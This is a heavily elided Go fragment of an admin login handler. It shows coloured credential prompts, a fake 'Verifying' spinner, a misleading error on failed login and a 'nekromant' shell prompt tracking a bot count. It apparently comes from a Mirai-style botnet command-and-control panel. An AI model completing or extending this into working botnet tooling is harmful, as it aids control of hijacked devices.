...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\033[34;1Username\033[33;3m: \033[0m"))
    ...
    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[34;1Password\033[33;3m: \033[0m"))
    ...
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;Verifying Login Details... \033[31m"), spinBuf[i % len(spinBuf)]))
    ...
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[32;1Unknown Error appeared\r\n"))
        this.conn.Write([]byte("\033[31Press any key to exit (any key)\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
...
`))
    ...
    for {
        ...
        var botCount int
        this.conn.Write([]byte("\033[32;1m" + username + "@nekromant# \033[0m"))
